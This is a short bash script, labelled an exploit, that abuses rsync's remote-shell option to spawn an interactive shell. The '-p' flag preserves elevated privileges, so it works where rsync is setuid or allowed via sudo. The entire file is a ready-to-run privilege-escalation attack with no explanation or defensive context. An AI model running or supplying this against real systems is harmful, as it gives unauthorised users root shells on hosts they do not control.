#!/bin/bash

echo -e "\nThis exploit may not work properly on upgraded version.\n"

rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null


